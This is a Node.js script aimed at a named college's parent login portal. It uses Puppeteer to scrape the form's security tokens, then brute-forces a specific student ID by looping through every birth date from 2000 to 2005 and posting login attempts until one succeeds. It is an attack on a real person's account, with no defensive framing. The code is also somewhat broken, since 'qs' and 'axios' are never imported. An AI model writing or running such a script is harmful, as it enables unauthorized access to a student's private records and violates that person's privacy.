const puppeteer = require("puppeteer");

const url = "https://parents.kletech.ac.in/kletechparentsupply/index.php";
const username = "01fe20bcs327";

// Function to fetch dynamic security values and password using Puppeteer
async function getDynamicValues() {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    await page.goto(url, { waitUntil: 'networkidle0' });

    // Wait for the security tokens to appear
    const securityCodeSelector = 'input[name="security_code"]';
    const securityCheckSelector = 'input[name="security_check"]';

    await page.waitForSelector(securityCodeSelector);
    await page.waitForSelector(securityCheckSelector);

    const security_code = await page.$eval(securityCodeSelector, el => el.value);
    const security_check = await page.$eval(securityCheckSelector, el => el.value);

    // Check if password is dynamically generated or hidden in form
    const passwd = await page.evaluate(() => {
        // If password is calculated dynamically by JS, extract it here
        // Example: return window.generatedPassword; or from a hidden input
        return document.querySelector('input[name="passwd"]').value;
    });

    await browser.close();

    if (!security_code || !security_check || !passwd) {
        throw new Error("Failed to extract dynamic values.");
    }

    console.log(`Extracted security_code: ${security_code}, security_check: ${security_check}, passwd: ${passwd}`);
    return { security_code, security_check, passwd };
}

// Function to attempt login with different birthdates
async function checkDates() {
    const tokens = await getDynamicValues();
    if (!tokens) return;

    const { security_code, security_check, passwd } = tokens;

    for (let yyyy = 2000; yyyy <= 2005; yyyy++) { // Adjust year range
        for (let mm = 1; mm <= 12; mm++) {
            for (let dd = 1; dd <= 31; dd++) {
                let formattedDD = dd.toString().padStart(2, "0");
                let formattedMM = mm.toString().padStart(2, "0");

                const data = qs.stringify({
                    username,
                    dd: formattedDD,
                    mm: formattedMM,
                    yyyy: yyyy.toString(),
                    passwd,
                    remember: "No",
                    security_code,
                    security_check,
                    option: "com_user",
                    task: "login",
                    return: "",
                    "91eeebbd728727f6109ae91f5123286f": "1",
                    usn: ""
                });

                try {
                    const response = await axios.post(url, data, { headers: { "User-Agent": "Mozilla/5.0" } });
                    console.log(`Checked ${formattedDD}-${formattedMM}-${yyyy}: Response Length ${response.data.length}`);

                    // If login is successful, break the loop
                    if (response.data.includes("success")) { // Adjust based on response
                        console.log(`Login successful for ${formattedDD}-${formattedMM}-${yyyy}`);
                        return;
                    }
                } catch (error) {
                    console.error(`Error for ${formattedDD}-${formattedMM}-${yyyy}:`, error.message);
                }
            }
        }
    }
}

checkDates();
